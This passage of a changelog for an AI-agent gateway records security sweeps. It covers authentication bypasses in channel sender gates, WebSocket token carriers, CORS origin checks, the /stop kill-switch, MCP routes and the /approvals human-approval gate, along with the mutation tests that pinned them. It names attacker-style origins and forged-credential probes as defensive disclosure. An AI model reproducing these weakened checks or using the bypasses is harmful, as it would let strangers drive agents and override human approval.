  `isApproved`; a coverage blind spot, not a live leak; production byte-identical).
  In `dmPolicy:"pairing"` mode the live channel handler admits a DM sender iff a
  STATIC allowlist match OR an APPROVED pairing: `discord/index.mjs:265-267` does
  `const staticOk = isAllowed(channelId); const approved =
  pairing.isApproved("discord", authorId); if (!staticOk && !approved) { …request…;
  return; }` (telegram is the twin). Sweeps #21/#23 pinned the STATIC arm; the
  `approved` arm — `pairing.isApproved(channel, id)` in `pairing-store.mjs` — had
  ZERO direct test coverage (`grep -rn isApproved test/` → nothing: `account-pairing`
  tests a different system, `account-links.mjs`; `pairing-routes` drives
  approve/revoke/pending through the HTTP handler but never `isApproved`). Mutating
  `isApproved` to `return true` — every sender reads as approved — left the FULL
  suite **green (3555/0)**: in pairing mode that admits ANY DM sender to the agent, a
  total channel-auth bypass. Fix (`test/pairing-approved-gate.test.mjs`, +7) pins the
  gate's two authz properties — it is EXACT-match (an approved id's superstring `5551`
  and prefix `55` are both denied, per sweep #21's embedding-negative rule) and
  CHANNEL-SCOPED (a telegram approval never admits the same id on discord) — plus the
  accept, the string/number coercion on both sides, and revoke de-authorizing.
  Mutation-verified RED in four directions (approve-anyone → 6 RED; deny-anyone → 3
  accept RED; channel-ignore → 1 scoping RED; `===`→`.includes` → 1 prefix RED);
  `pairing-store.mjs` restored byte-identical (`bc3dfe83…`). Suite 3555→**3562/0**.
  Honest limit (as #21/#23): pins the pure store decision, not the handler's
  `!staticOk && !approved` combination, which stays untested wiring.

## 3.205.0 (2026-08-25)

- TEST (sweep #23 — the **Discord** call site of the channel sender-auth gate; a
  coverage blind spot, not a live leak; production code byte-identical). Sweep #21
  pinned the pure `isSenderIdAllowed` and its Telegram wiring (`gateTelegram`), but
  per the both-layers discipline of sweep #15 that does NOT pin the Discord wiring.
  `allowedDiscordChannel(id)` → `isSenderIdAllowed(dcAllow, …)` is the sole guard
  before the agent runs on a Discord message — `discord/index.mjs:287-291` does a
  bare `return` on `!isAllowed(channelId)` in allowlist / non-open mode — yet NO
  test drove `gateDiscord` or `allowedDiscordChannel` (the only test file to mention
  them did so in a comment). Two mutations left the FULL suite **green (3549/0)**:
  (A) `allowedDiscordChannel` → `return true` admits ANY Discord channel; (B)
  `dcAllow = compileAllowlist(discord.allowedChannelIds || discord.allowFrom || [])`
  dropping the `allowedChannelIds` key compiles an EMPTY allowlist, so
  `allowWhenEmpty` admits everyone — a silent, config-shaped bypass invisible to a
  green suite. Fix (`test/channel-allow-policy.test.mjs`, +6) pins the wiring:
  listed channel → allow; unlisted → deny (`channel_not_allowed`) with
  `allowedChannelIds` configured (this one test catches BOTH mutation A and mutation
  B); `channel_id` snake_case extraction; no-channel → `no_channel`; the `allowFrom`
  alias key; and the open-default when unconfigured. Mutation-verified RED in three
  directions (accept-anything → 3 deny/alias RED; deny-anything → 4 allow RED; drop
  key → 2 configured-deny RED); `policy.mjs` restored byte-identical
  (`bacec9f8…`). Suite 3549→**3555/0**. The recurring lesson: a shared auth gate has
  one test-home per call site — pinning it through one wrapper never pins another.

## 3.204.0 (2026-08-25)

- TEST (sweep #21 — the channel **sender-authorization gate**, `isSenderIdAllowed`
  / `gateTelegram`; a coverage blind spot, not a live leak). This is a NEW authz
  axis: distinct from gateway token auth (#1–#20) and from CORS response-read authz
  (#19), it decides WHO — which chat id — may command the agent over Telegram /
  Discord in allowlist or pairing mode. `isSenderIdAllowed(allow, senderId,
  allowWhenEmpty)` is the decision behind every channel gate, yet it had ZERO
  behavioural test: it is reached only through `createChannelPolicy`
  (`gateTelegram` / `allowedChatId` / `allowedDiscordChannel`), and the Telegram
  callback path (`authorizeTelegramCallback`) has its OWN inline `allow.includes()`
  so its tests never exercised it. Proof it was blind: mutating the core compare to
  admit everyone — `return allow.entries.includes(id)` → `return true` — left the
  FULL suite **green (3536/0)**; a configured `allowedChatIds` allowlist would then
  accept ANY chat id, letting a non-listed chat drive the agent (in allowlist mode
  `if (!policy.gateTelegram(update).ok) return;` is the sole gate to the agent). The
  webhook-wiring test (sweep #15) uses `gateTelegram()=false` only as a mechanism to
  reach the pairing branch and never distinguishes allow from deny. Fix
  (`test/channel-allow-policy.test.mjs`, +13) pins BOTH layers: the pure gate
  (listed→allow, unlisted→deny, superstring/prefix embedding negatives so an
  `includes`/`startsWith` weakening is caught, wildcard `*`, empty-list
  `allowWhenEmpty` open-vs-fail-closed, missing-senderId deny, case-insensitive
  match) AND the `gateTelegram` wiring (DM allow/deny with `reason:"chat_not_allowed"`,
  the GROUP allowlist used distinctly from the DM list, `callback_query` chat-id
  extraction, `no_chat`). Mutation-verified both directions: accept-anything
  (`return true`) turns 7 deny tests RED; always-deny (`return false`) turns 5 allow
  tests RED. Production code UNCHANGED — `allow-from.mjs` byte-identical (sha256
  `4301b1ab…`). Suite **3549/0**.

## 3.203.0 (2026-08-25)

- TEST (sweep #20 — the WebSocket **header carriers**' wrong-token rejection; a
  coverage blind spot, not a live leak, extending #18). `authorizeWebSocket`
  accepts a token from four separately-extracted carriers before the shared
  `tokenEqual` compare: `Authorization: Bearer <t>`, `x-xclaw-token` / `x-api-key`
  headers, `?token=` query, and the `xclaw.token.<t>` subprotocol
  (`got = bearer || x || q || sub`). Sweep #18 pinned the subprotocol carrier's own
  reject; the query carrier had `?token=nope`. But NO test ever sent a WRONG token
  through any HEADER carrier, and two of them (Bearer, x-api-key) had no accept test
  at all. Proof it was blind: weakening just the Bearer extraction to accept any
  value — `const bearer = hdr.startsWith("Bearer ") ? token : ""` — left the FULL
  suite **green (3528/0)**; an `Authorization: Bearer <wrong>` would reach the
  runAgent socket on `/ws/voice` unauthenticated. Fix (`test/ws-auth.test.mjs`,
  19→27): a wrong token via each of Bearer / x-xclaw-token / x-api-key is rejected
  on BOTH `/ws/events` and `/ws/voice` (neither path more open than the other), and
  a valid token via Bearer + x-api-key is accepted (the two carriers that had no
  positive test). Mutation-verified both directions: the Bearer accept-anything
  weakening turns exactly the two Bearer reject cases RED (25/2); dropping the
  x-api-key alternative from the `x` extraction turns only the x-api-key accept case
  RED (26/1). Production code UNCHANGED — `auth.mjs` byte-identical (sha256
  `6ddaa4d3…`); the live gateway already 401s every wrong-token header carrier on
  both upgrade paths. Suite **3536/0**.

## 3.202.0 (2026-08-25)

- TEST (sweep #19 — the gateway **CORS reflection policy**'s exact-match branches;
  a coverage blind spot, not a live leak). `corsOriginFor` decides which
  cross-origin pages may READ gateway responses; on a tokenless lab gateway it is
  the only thing between a drive-by web page and `/sessions`, `/config`, etc. Every
  allow-branch is an EXACT match — `Set` membership for loopback origins
  (127.0.0.1 / localhost / ::1), and `=== ` / `Array.includes` for the operator
  allowlist. `gateway-cors.test.mjs` had five cases, but every negative one
  presented an origin DISJOINT from an allowed value (`https://evil.example`,
  `https://other.example`), so it never exercised the exactness of the compare.
  Proof it was blind: two independent one-line weakenings each left the suite
  **green (5/5)** — (A) loopback `LOOPBACK_HOSTS.has(host)` → `host.includes(h)`
  reflected `http://127.0.0.1.evil.com` (attacker registers a domain that EMBEDS a
  loopback label), and (B) the string-config `conf === origin` → `origin.startsWith(conf)`
  reflected `https://app.example.evil.com` against config `https://app.example`
  (attacker registers a suffix domain). Both are textbook CORS-bypass classes and
  both survived CI. Fix: four cases pin the exactness — a loopback host embedded as
  a substring (incl. `notlocalhost` and a port variant) is NOT reflected, userinfo
  that looks like a loopback host (`http://127.0.0.1@evil.com`, real host wins) is
  NOT reflected, and a configured string/list origin is matched exactly (a suffix
  domain AND a one-char-short prefix both rejected, in both directions). Mutation-
  verified: weakening (A) and weakening (B) each turn this file RED (8/1); the
  accept direction stays pinned by the existing loopback + exact-match cases.
  Production code UNCHANGED — `cors.mjs` byte-identical (sha256 `b5c1cfb4…`), the
  live gateway already returns `null` for every adversarial origin above. Suite
  **3528/0**.

## 3.201.0 (2026-08-25)

- TEST (sweep #18 — the WebSocket **subprotocol carrier**'s rejection half; a
  coverage blind spot, not a live leak). A browser cannot set `Authorization` or
  `x-xclaw-token` on a WS handshake, and `?token=` leaks the token into access
  logs, so `Sec-WebSocket-Protocol: xclaw.token.<t>` is the ONLY carrier the
  Control UI can use — the real-world WS auth path. `ws-auth` drove that carrier
  with the CORRECT token only (accept + echo, on both `/ws/events` and
  `/ws/voice`); both of its wrong-token rejections went through the `?token=nope`
  query carrier instead. `authorizeWebSocket` EXTRACTS the subprotocol token
  separately (`sub = p.slice("xclaw.token.".length)`) before the shared
  `tokenEqual`, so that extraction had no rejection test of its own. Proof it was
  blind: mutating the extraction to `sub = token` — accept ANY `xclaw.token.*`
  value regardless of what the client presented — left the full suite **green
  (3518/0)**: the shared compare is pinned only by the query carrier's
  `?token=nope`, and no test ever sent a wrong non-empty token through the
  subprotocol. This is the WS analog of the HTTP acceptance gap closed in 3.196.0.
  Fix: six cases in `ws-auth.test.mjs` pin the subprotocol carrier's rejection on
  BOTH upgrade paths, with `nope` + a one-char-short prefix + a superstring so a
  `startsWith`-style weakening is caught in either direction too. Mutation-verified:
  `sub = token` now fails exactly the six new cases (13 pre-existing still pass),
  and the accept direction stays pinned by the existing correct-token subprotocol
  cases. Production code UNCHANGED — `auth.mjs` byte-identical (sha256
  `6ddaa4d3…`). Suite **3524/0**.

## 3.200.0 (2026-08-25)

- TEST (sweep #16 — the `/stop` gate's config-driven **fail-closed** branches; a
  coverage blind spot, not a live leak). `/stop` is the session kill-switch: an
  accepted request aborts every running loop and drains WS+SSE. Sweep #16 began as
  an accept-symmetry check, but the accept side was already pinned twice
  (`stop-hmac` "accepts valid signature" + `stop-hmac-canonical` "accepts reordered
  body") and the token accept/reject too. Reading the source surfaced the real gap:
  the two branches that only fire when a deployment is **misconfigured** —
  `authorizeStop` refusing when a prod/strict/`requireAuth` gateway has NO token
  (`STOP_AUTH_REQUIRED`, `stop-auth.mjs:86`), and `verifyStopSignature` refusing when
  hmac is required but NO secret is set (`STOP_HMAC_REQUIRED`, `stop-auth.mjs:39`).
  Both are the defense-in-depth that stops a fat-fingered prod deploy from shipping
  an unauthenticated kill-switch. Neither reject code was asserted anywhere — the
  only occurrences of `STOP_AUTH_REQUIRED`/`STOP_HMAC_REQUIRED` in the whole suite
  were descriptive strings in `gateway-route-coverage`'s routes map. Proof they were
  blind: neutering `if (prod/strict/requireAuth)` to `if (false)` — so an
  unconfigured prod gateway falls through to `{ok:true, skipped, no_token_lab}` and
  accepts ANY unauthenticated `/stop` — left the full suite **green (3511/0)**; same
  for `const required = false` in the hmac branch.
- `test/stop-auth-failclosed.test.mjs` closes it by pinning the third row of each
  decision table ("required, but nothing configured → refuse") plus, for symmetry so
  a mutation that *closes* the deliberately-open lab path is also caught, the
  "not-required, nothing configured → skip" row: prod/strict/`requireAuth` + no token
  → `STOP_AUTH_REQUIRED`; lab + no token → open (`no_token_lab`); hmac required + no
  secret → `STOP_HMAC_REQUIRED`; hmac unset + no secret → skipped. One case drives the
  wired route (`handleStopAll`) to prove the decision reaches an actual **HTTP 401**,
  even for a dry-run body (auth is checked before the dry-run bypass). Override env
  (`XCLAW_STOP_TOKEN`/`XCLAW_GATEWAY_TOKEN`/`XCLAW_STOP_AUTH`/`XCLAW_STOP_HMAC`/
  `XCLAW_STOP_HMAC_SECRET`) is neutralized so cfg drives deterministically.
  Mutation-proven both directions: RED (4/7 — the 3 token rejects + the wired 401)
  when the prod branch is neutered, RED (1/7 — the hmac reject) when the hmac branch
  is neutered, GREEN (7/7) on the real code. No production code changed —
  `src/gateway/stop-auth.mjs` is byte-identical (sha256 73d23e9a…). Suite 3518/0.

## 3.199.0 (2026-08-25)

- TEST (sweep #15 — the Telegram webhook **wiring**, not the verifier; a coverage
  blind spot, not a live leak). Sweeps #12–#14 pinned wrong-credential *acceptance*
  on self-authenticating gates. This one is different: the pure verifier
  `verifyTelegramWebhookSecret()` is already unit-tested for the wrong-secret reject
  (`telegram-p0`), so the compare is covered — but a pure-function test proves nothing
  about the **call site**. `/channel/telegram/webhook` is deliberately EXEMPT from the
  gateway's main auth gate (`isProtectedPath("/channel/telegram/webhook") === false` —
  it self-authenticates with Telegram's secret header instead of a Bearer), so the
  ONLY thing between a forged inbound POST and `handleUpdate()` driving the bot is one
  line in `handleWebhookRequest` (`src/channels/telegram/index.mjs`):
  `if (!v.ok) return { ok: false, ...v };`. NO test drove that wiring — the only
  references to `handleWebhookRequest` were its definition and the gateway call site.
  Deleting the refusal (so a POST with a WRONG or MISSING secret is processed as a
  genuine update) left the full suite **green (3507/0)**. This is the sweep #6
  wiring-defect class on an intentionally auth-exempt route: a regression dropping the
  check would ship, and an attacker reaching the exempt path could inject arbitrary
  inbound updates.
- `test/telegram-webhook-wiring.test.mjs` closes it by driving the real handler
  through `createTelegramChannel` + a mock Bot API, observing the **side effect**
  (did `handleUpdate` run?) rather than the return value alone: correct secret →
  `{ok:true}` AND ≥1 outbound call (the pairing reply fired); wrong secret →
  `{ok:false, reason:"bad_secret"}` AND **zero** outbound (the forged update was never
  processed); missing header → `missing_secret_header` + zero outbound; no configured
  secret → fails CLOSED (`secret_not_configured`) + zero outbound. A non-matching
  `allowedChatIds` forces the deterministic no-LLM pairing branch (`allowWhenEmpty`
  defaults true, so an empty allowlist would send the DM to the agent). Mutation-proven
  both directions: RED (3/4) when the refusal is dropped, RED (4/4) when the guard is
  inverted to `if (v.ok)`, GREEN (4/4) on the real code. No production code changed —
  `src/channels/telegram/index.mjs` is byte-identical (sha256 b523645f…).

## 3.198.0 (2026-08-25)

- TEST (sweep #14 — credential-**acceptance** coverage on the computer-control
  plane, not a live leak). Sweeps #12/#13 pinned acceptance on the gateway HTTP
  `check()` and the `/stop` `authorizeStop()`. This sweep carries the same
  wrong-credential probe to the third self-authenticating gate: `verifyComputerAuth()`
  in `computer/auth.mjs`, which fronts real machine control (mouse / keyboard /
  screenshot) and has **two** acceptance decisions — its own token compare
  (`got !== token`) and a full HMAC layer (a 5-minute timestamp replay window plus a
  `timingSafeEqual` signature over `${ts}.${body}`). The three files touching it
  (`computer-contract`, `computer-auth-client`, `auth-proxy`) only ever asserted
  missing-token → 401, correct-token → ok, and correct-token + **correct** HMAC → ok.
  No test ever sent a wrong non-empty token, a forged signature, a stale timestamp,
  or missing HMAC headers when `authHmac` was on — so **both** halves were unpinned:
  mutating `computer/auth.mjs` line 42 `if (got !== token)` to `if (!got)` (accept
  ANY presented token) left the full suite **green (3491/0)**, and independently
  disabling the signature compare on line 53 (accept ANY signature) **also** left it
  **green (3491/0)**.
- `test/computer-auth-wrong-cred.test.mjs` closes it: per carrier
  (`Authorization: Bearer`, `X-XClaw-Computer-Token`) it rejects a wrong non-empty
  token (with prefix / superstring / case-flip guards) and accepts only the exact
  token; and with `authHmac` on it rejects missing HMAC headers (`missing_hmac`), a
  forged same-length signature and a forged wrong-length signature (`bad_signature`),
  and a stale timestamp carrying an otherwise-correct signature (`stale_timestamp`),
  while accepting a correct timestamp+signature. Mutation-proven three ways: RED
  (8/16) under the `if (!got)` truthiness accept, RED (2/16) under the disabled
  signature compare, RED (15/16) under an inverted token compare, GREEN (16/16) on
  the real code. This gate is genuinely secondary: per `gateway/computer-proxy.mjs`
  the live single-port gateway fronts the computer prefixes with the **main** auth
  `check()` (pinned in #12), and `verifyComputerAuth` is exercised only by the opt-in
  auth-proxy on :4244 — so this is coverage hardening of an opt-in layer, not a live
  leak. No production code changed — `computer/auth.mjs` is byte-identical
  (sha256 d1906069…).

## 3.197.0 (2026-08-25)

- TEST (sweep #13 — credential-**acceptance** coverage on the kill-switch, not a
  live leak). Sweep #12 pinned the main HTTP `check()` acceptance half; this
  sweep applies the same wrong-credential probe to the **separate**
  `authorizeStop()` gate that guards `POST /stop`. That gate matters: a
  token-accept bug there lets anyone **halt the agent's running work**. It has
  its own `tokenEqual()`, an extra `x-xclaw-stop-token` carrier the main gate
  doesn't read, and a dedicated `stopToken` precedence — none of it covered for a
  wrong token. The whole 44-file stop suite only asserted missing-token → 401
  (empty) and correct-token → ok; the one body-bearing "rejects" case
  (`stop-hmac.test.mjs`) sends the **correct** token plus a bad HMAC sig, so it
  pins the signature half, not the token compare. Mutating `gateway/stop-auth.mjs`
  line 92 `if (!tokenEqual(got, expected))` to `if (!got)` — accept ANY presented
  token on the kill-switch — left the full suite **green (3464/0)**.
- `test/stop-auth-wrong-token.test.mjs` closes it: it drives `authorizeStop()`
  with a wrong non-empty token through every carrier `extractStopToken()` reads
  (`Authorization: Bearer`, `x-xclaw-token`, `x-xclaw-stop-token`, `x-api-key`,
  `?token=`) and asserts `ok:false` / `STOP_UNAUTHORIZED`, accepts only the exact
  token, and pins the dedicated-`stopToken` precedence (once a stop token is set,
  the general gateway token must **not** open `/stop`). Prefix and superstring
  cases defend against a `startsWith`-style weakening either way. Mutation-proven
  both ways: RED (21/27) under the `if (!got)` truthiness accept, RED (27/27)
  under an inverted `tokenEqual` compare, GREEN (27/27) on the real compare. No
  production code changed — `gateway/stop-auth.mjs` is byte-identical
  (sha256 73d23e9a…).

## 3.196.0 (2026-08-25)

- TEST (sweep #12 — credential-**acceptance** coverage, not a live leak). The
  forgotten-route class (3.190.0–3.195.0) asks "is this path protected?"; this
  sweep asks the other half — "given a protected path, does the gate accept only
  the correct token?" It does in production (`tokenEqual` is a sound
  constant-time compare), but the HTTP `check()` acceptance decision was
  **untested**: every in-process auth test asserted only no-token → 401 and
  correct-token → 200. Neither notices a compare weakened to a truthiness test.
  Mutating `gateway/auth.mjs` line 292 `if (tokenEqual(got, token))` to
  `if (got)` — accept ANY presented token — left the full suite **green
  (3444/0)**: no-token requests still fell through to 401, the correct token
  still passed, and no HTTP test ever sent a wrong non-empty token. Only the WS
  path (`ws-auth.test.mjs`, `?token=nope`) pinned wrong-token → 401, and that
  drives the separate `authorizeWebSocket()`.
- `test/gateway-auth-wrong-token.test.mjs` closes it: on a protected path it
  drives `check()` with a wrong non-empty token through every carrier
  (`Authorization: Bearer`, `x-xclaw-token`, `x-api-key`, `?token=`) and asserts
  `ok:false`, and accepts only the exact token. Prefix and superstring cases
  additionally defend against a `startsWith`-style weakening in either direction.
  Mutation-proven both ways: RED (16/20) under the `if (got)` truthiness accept,
  RED (20/20) under an inverted `!tokenEqual` compare, GREEN (20/20) on the real
  compare. No production code changed — `gateway/auth.mjs` is byte-identical
  (sha256 6ddaa4d3…).

## 3.195.0 (2026-08-25)

- SECURITY (sweep #11 — a **live, multi-route data-exposure bypass**, same
  default-ALLOW root cause as 3.190.0–3.193.0: the gate in `gateway/auth.mjs`
  returns `false` for any path no list names, and these were served routes no
  list named). On the DEFAULT token gateway, measured against the live socket, an
  anonymous `GET` returned real data:
  - `/ledger`, `/ledger/stats`, `/ledger/who-touched` — the full cost/audit
    ledger: the same command+actor+decision events `/security/decisions` serves,
    plus every spend row and the per-file actor trail (~197KB of history).
  - `/usage/cache`, `/usage/dashboard`, `/usage/efficiency` — spend and
    session-preview analytics. Only the **exact** `/usage` arm was gated; its
    siblings `/cost` and `/logs` each gate the **prefix** too. The one missing
    `p.startsWith("/usage/")` was the whole defect.
  - `/gateway/doctor`, `/status/report`, `/routes` — diagnostics and the entire
    **served attack surface as JSON**. `/doctor` was gated; `/gateway/doctor` (the
    same detailed report under a different prefix) fell through.
  - `/api/voice/speak`, `/api/voice/transcribe` — the local synth/transcribe
    compute pipeline.
- Closed in `auth.mjs isProtectedPath` (grouped with the controls they belong
  to: `/ledger*` with `/cost`, `/usage/*` with its gated siblings, the
  diagnostics together). `/gateway/info` + `/info` deliberately stay **open** —
  the supervisor polls `/gateway/info` every 15s as its liveness signal and reads
  any non-2xx as unhealthy → restart (`scripts/gateway-supervisor.mjs:141,288`,
  bare fetch, no token); the payload is sanitized config only. Protecting it
  would have driven a restart storm — caught before shipping.
- **The recurring honest limit is closed this time, structurally.** The last five
  sweeps carried the same note: `routes-map.mjs` does not declare every served
  path, so a test that walks the *declared* inventory cannot see an *undeclared*
  served route — which is exactly how every one of these bypasses got in. New
  `test/gateway-served-inventory.test.mjs` walks the router's **served** set
  instead: it extracts every path-literal the router compares against
  (`x === "/foo"`, `x.startsWith("/foo")`) straight from `index.mjs` and every
  `routes/*.mjs` sub-router (188 literals), and requires each protected unless it
  is on a short, justified OPEN list (21 entries, each with the reason it is safe
  unauthenticated). A served route that is neither protected nor justified fails
  CI **with its own path** — whether or not `routes-map` declares it, before it
  ships, not 100 releases later. The extraction is deliberately over-approximate
  (checks more strings, never fewer), so a real served path cannot slip past by
  being missed.
- Mutation-verified both directions: injecting a brand-new served literal
  (`/pwn2025`) into a sub-router makes the inventory test go **RED naming
  `/pwn2025`** (proving it reads live router source, not a static list); removing
  the `p.startsWith("/usage/")` arm makes it go **RED on the three `/usage/*`
  paths**. Both restored byte-identical (`auth.mjs sha256 6ddaa4d3…`).
- Wiring layer: `gateway-auth-enforcement.test.mjs` now drives real anonymous
  requests for all 11 routes through the child-process socket (→ `401`), with an
  operator-token mirror (`GET /ledger` → not-`401`) and a path-discrimination
  control (anonymous `GET /gateway/info` → not-`401`, the supervisor path). The
  now-redundant ad-hoc "undeclared-but-served" block in
  `gateway-route-coverage.test.mjs` (which pinned `/agent-runs`,
  `/artifacts/file`, `/channel/webchat/message` by hand) is removed — the
  served-inventory test covers all three systematically.

## 3.194.0 (2026-08-25)

- SECURITY (sweep #10 — a coverage blind spot on the **MCP JSON-RPC plane**,
  closed before it could ship open). Unlike the 3.190.0–3.193.0 bypasses, this
  was **not a live leak**: `/mcp` was protected in production the whole time.
  The defect was that the entire plane — `POST /mcp` (runs the agent as an MCP
  server), `POST /mcp/call` (invokes a tool, bash included), `POST /mcp/servers`
  (writes MCP config **and stored credentials**), `/mcp/resources` (reads
  resources and transcripts) — hung on a **single list term** in
  `gateway/auth.mjs` (`p.startsWith("/mcp")`) with **zero behavioural coverage**.
  Every MCP auth assertion in the suite went through `check()`/`isProtectedPath`
  on the OAuth subpaths only. Measured: narrowing that one term to
  `"/mcp/oauth"` opens the whole agent + data plane on a token gateway and the
  **full suite stayed green (3222/0)** — the same default-ALLOW root cause, one
  forgotten test away from a live bypass.
- Closed at both layers, matching 3.193.0's shape:
  - **List layer** — `routes-map.mjs` now declares the 15 served `/mcp` routes,
    so `gateway-route-coverage.test.mjs` (which walks the gateway's own declared
    inventory) requires each protected. The OAuth AS redirect
    `/mcp/oauth/callback` is open-listed with its reason (state-authenticated,
    never token-authenticated).
  - **Wiring layer** — `gateway-auth-enforcement.test.mjs` drives real anonymous
    requests through the child-process socket (`POST /mcp`, `POST /mcp/call`,
    `GET /mcp/servers`, `GET /mcp/resources`, `POST /mcp/oauth/start` → `401`),
    with operator token mirrors (`POST /mcp` JSON-RPC, `GET /mcp/servers` →
    not-`401`) and a path-discrimination control (anonymous
    `GET /mcp/oauth/callback` → not-`401`). This catches a *wiring* skip — a gate
    reached only for some paths — that a list test cannot, exactly the class of
    the `/v1`, computer-plane and `/ws/voice` defects that file exists for.
  - Both new guards were mutation-verified RED under the narrowing (14 fails: 4
    wiring + 10 coverage) and GREEN restored; `auth.mjs` is byte-identical
    (`sha256 5c521c77…`), so no production behaviour changed.
- Honest limit (unchanged, still tracked): `routes-map.mjs` still does not
  declare every served path (`/agent-runs`, `/artifacts/file`, `/ws/voice`,
  `/v1/*`, `/pairing/*`). One registry that the router, the auth gate and the
  coverage test all read is the real structural close.

## 3.193.0 (2026-08-25)

- SECURITY (sweeps #8 and #9 — two more authentication bypasses, same root
  cause as 3.190.0/3.191.0/3.192.0: **the gate in `gateway/auth.mjs` is
  default-ALLOW**, so any route no list names is served without a token, and
  every enforcement decision was split across hand-written lists that drift).
  Both are closed here, together with the structural test that makes the *next*
  missing route fail CI instead of shipping.
- **Sweep #9 — `/approvals` was open on the DEFAULT gateway, and it was
  exploited live in production before the fix.** `routes-map.mjs` declares
  `/approvals` as `Alias: pending approvals` — the same data and the same
  `approvalGate.decide()` call as `/security/pending` + `/security/decide`,
  which were gated. The alias was in **neither** auth list. Measured on the
  live gateway, no credentials:
  - `GET /approvals` → **`200`** leaking a real **critical-tier** pending in
    full: `xclaw_file_write` with its `file_path` **and** `content`, while the
    canonical `GET /security/pending` → `401` (control: auth was on).
  - `GET /agent-runs` → **`200`** streaming real persisted session history.
  - `POST /approvals/approve` → **`200`**, `{ok:true, approved:true,
    mode:"human"}`, ledgered `actor:"operator"`, `risk.tier:"critical"`,
    `reversibility:"irreversible"` — the last **human** gate in front of a
    risky command, decided by a request with no credentials. The 3.126.0
    workspace-containment guard happened to stop that one write, so end-to-end
    execution was not observed; defence-in-depth caught what the missing auth
    let through. `auth.mjs` contained zero occurrences of "approval" — an
    omission, not a decision.
- **Sweep #8 — agent execution was open in `authStrict:false`, and the
  Telegram webhook was closed in the default.** There were two auth lists — a
  "legacy" subset for `gateway.authStrict:false` and a strict superset — and
  they drifted. `/channel/` ended up in the strict list only, so on an
  `authStrict:false` gateway `POST /channel/webchat/message`, **which runs the
  agent**, answered without credentials (measured: `200` anon, byte-identical
  to the authenticated response), while `/agent/run`, `/artifacts/list` and
  `/config` all refused. Meanwhile on the strict default the `/channel/` prefix
  swallowed the inbound **Telegram webhook**, which Telegram calls with its
  secret header and never a Bearer: the operator gate answered `401` before the
  handler ran (measured: `401` anon with a correct secret, `503
  telegram_disabled` with an operator Bearer — the gate, not the handler), so a
  tokened gateway went silent.
- **Fix.** The two lists are collapsed into one; `gateway.authStrict` is still
  accepted and reported but no longer decides what the gate protects.
  `/channel/telegram/webhook` is exempted before the list (self-verifying, fails
  closed). `/approvals`, `/approvals/*` and `/agent-runs` join the protected
  surface beside their `/security/*` canonical. Phantom `/seats` and `/models`
  (nothing has ever served them — `404` with a valid token) and the duplicate
  `/doctor` were dropped: one fewer entry to keep in sync is the point.
- **Structural fix — `test/gateway-route-coverage.test.mjs`.** It walks
  `routes-map.mjs`'s declared inventory and requires every route to be protected
  on a default token gateway *except* an explicit 11-entry open-list, each with
  the reason it is safe unauthenticated (probes, public JWKS documents, the UI
  pages, and the two self-authenticating `/stop` aliases). A unit test of the
  auth list agrees with the list by construction; this inverts the default so a
  route the list forgot fails with its own path. Honest limit: `routes-map`
  does not declare every served path (`/agent-runs`, `/artifacts/file`,
  `/ws/voice`, the `/v1/*` aliases), so this catches the class only for declared
  routes — the undeclared ones are pinned separately and closing the
  declaration gap is the real structural fix (tracked, not done here).
- Tests: pure (`gateway-approvals-auth`, `gateway-channel-auth`,
  `gateway-route-coverage`) plus a child-process live gateway
  (`gateway-approvals-live`) that reproduces the leak on a real socket — anon
  `POST /approvals/approve` is now `401`, not the pre-fix `404
  APPROVAL_NOT_FOUND` that proved the handler had run. Every new enforcement
  point was mutation-swept to RED before shipping. Full suite 3222/0.

## 3.192.0 (2026-08-25)

- SECURITY (sweep #7 — two defects in the `gateway.publicUi` lockdown, plus a
  fourth authentication bypass found by writing the test for them). The root
  cause is the one 3.190.0 and 3.191.0 both had: **one route set, described by
  two hand-written lists that drifted.**
- `gateway.publicUi: false` is the operator's "the UI is not public" switch,
  and it shipped **ON in the `prod` profile** (`src/config/profiles.mjs:69`)
  with **zero test occurrences of the string `publicUi` anywhere under
  `test/`**. Both defects below were reproduced on real sockets against real
  child gateways before any source changed.
- **Defect 1 — the lockdown was one character wide.** `gateway/index.mjs`
  served the webchat page at `/`, `/chat` and `/chat/`; the auth list matched
  `/chat/` only. Measured, token configured and lockdown on: `GET /chat/`
  → `401`, `GET /chat/app.js` → `401`, but `GET /chat` → **`200` with the
  page**, and `GET /` → **`200` with the same page**. The locked-down UI was
  one keystroke away.
- **Defect 2 — the switch INVERTED protection.** The branch returned
  `required` (true only when a token is configured), which short-circuits the
  `if (!required && !requireAuth) return false;` fail-closed below it. So on a
  `requireAuth` gateway with no token yet configured — the shipped `prod`
  shape — turning the lockdown ON opened everything it claimed to close.
  Measured on two gateways identical but for the flag: `GET /artifacts/list`
  → `401` with `publicUi:true`, and → **`200` with a 50-entry listing of the
  real workspace** with `publicUi:false`.
- **Defect 3 — `/artifacts/file` returned workspace file bytes to anyone.**
  Found by writing the unit test for the above and refusing to loosen the
  assertion when it failed. `/artifacts/list` was in the strict list;
  `/artifacts/file`, which returns the **file contents**, was in neither list.
  Measured on a default, token-protected gateway: `/artifacts/list` with no
  credentials → `401`, `/artifacts/file?path=…` with no credentials →
  **`200`, 76894 bytes, byte-identical to the authenticated response.** Only
  `resolveArtifactFile`'s workspace containment and extension allowlist stood
  between an anonymous caller and the operator's files.
- Fix: **`src/gateway/ui-routes.mjs`** — one table that says which paths are
  static UI pages and which app+file each maps to. `gateway/auth.mjs` asks it
  which paths the lockdown covers, `gateway/index.mjs` asks it what to serve,
  and `gateway/routes/artifacts.mjs` asks it whether a path is the artifacts
  page. A page can no longer be reachable at a path the gate was not told
  about, because there is no second list to disagree with. The lockdown branch
  now returns `required || requireAuth`, restoring the fail-closed contract,
  and `/artifacts/` joins `core` — protected in **both** legacy and strict
  modes, like `/transcripts` and `/memory`, so a third artifacts route cannot
  land outside the gate the way the second one did.
- Tests: `test/gateway-public-ui.test.mjs` (pure — the route table, both
  lockdown directions, and the inversion as a **property**: for every path,
  `publicUi:false` must protect at least as much as `publicUi:true`) and
  `test/gateway-publicui-lockdown.test.mjs` (a real child gateway on a real
  socket). The second file is not redundant: a unit test that asserts the auth
  list cannot catch the auth list disagreeing with the router — the list *is*
  the bug, so the test agrees with it by construction. Every refusal has a
  mirror differing only by the `Authorization` header, so a gate that 401s
  everything fails too. All five new enforcement points were mutation-swept to
  RED (2, 11, 4, 8 and 2 failures).
- The live file seeds its own artifact into a temp workspace via
  `agent.workingDir`. The first cut read whatever the checkout happened to
  contain, which passed locally against 50 real artifacts and failed on a
  fresh CI clone that has none — caught by CI on the tagged commit, fixed
  before the release moved.
